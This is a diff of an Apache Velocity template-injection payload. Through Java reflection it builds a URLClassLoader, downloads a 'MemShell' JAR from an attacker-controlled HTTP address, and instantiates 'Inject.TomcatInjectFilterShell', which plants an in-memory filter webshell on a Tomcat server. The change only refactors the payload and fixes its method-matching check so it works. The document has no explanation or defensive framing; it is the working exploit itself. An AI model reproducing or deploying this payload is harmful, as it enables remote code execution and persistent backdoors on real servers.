@@ -1,39 +1,23 @@
 #set($x='')
-
-#set($url0 = $x.class.forName('java.net.URLClassLoader'))
-
-#set($url1 = $x.class.forName('[Ljava.net.URL;'))
-
-#set($url2 = $x.class.forName('java.net.URL'))
-
-#set($url00 = $url0.getConstructor($url1))
-
-#set($url22 = $url2.getConstructor($x.class.forName('java.lang.String')))
-
-#set($url222 = $url22.newInstance('http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar'))
-
-#set($array = $x.class.forName('java.lang.reflect.Array'))
-
-#set($methods = $array.getMethods())
-
-#set($flag = 'newInstance(java.lang.Class,int)')
-
+#set($urljar='http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar')
+#set($url0=$x.class.forName('java.net.URLClassLoader'))
+#set($con=$x.class.forName('java.lang.reflect.Constructor'))
+#set($url1=$x.class.forName('[Ljava.net.URL;'))
+#set($url2=$x.class.forName('java.net.URL'))
+#set($url00=$url0.getConstructor($url1))
+#set($url22=$url2.getConstructor($x.class.forName('java.lang.String')))
+#set($url222=$url22.newInstance($urljar))
+#set($array=$x.class.forName('java.lang.reflect.Array'))
+#set($methods=$array.getMethods())
+#set($flag='newInstance(java.lang.Class,int)')
 #foreach($method in $methods)
-#if($method.toString().equal($flag))
-
-#set($urlArray = $method.invoke($array,$url2,1))
-
-#set($objArray = $method.invoke($array,$x.class.forName('[Ljava.lang.Object;'),1))
-
+#if($method.toString().contains($flag))
+#set($urlArray=$method.invoke($array,$url2,1))
+#set($objArray=$method.invoke($array,$x.class.forName('[Ljava.lang.Object;'),1))
 $array.set($urlArray,0,$url222)
-
 $array.set($objArray,0,$urlArray)
-
-#set($urlclassloader = $url00.newInstance($objArray))
-
-#set($loadClass = $url0.getMethod('loadClass', $x.class.forName('java.lang.String')))
-
-#set($obj = $loadClass.invoke($urlclassloader,'Inject.TomcatInjectFilterShell').newInstance())
+#set($urlclassloader=$url00.newInstance($objArray))
+#set($loadClass=$url0.getMethod('loadClass',$x.class.forName('java.lang.String')))
+#set($obj=$loadClass.invoke($urlclassloader,'Inject.TomcatInjectFilterShell').newInstance())
 #end
 #end
-
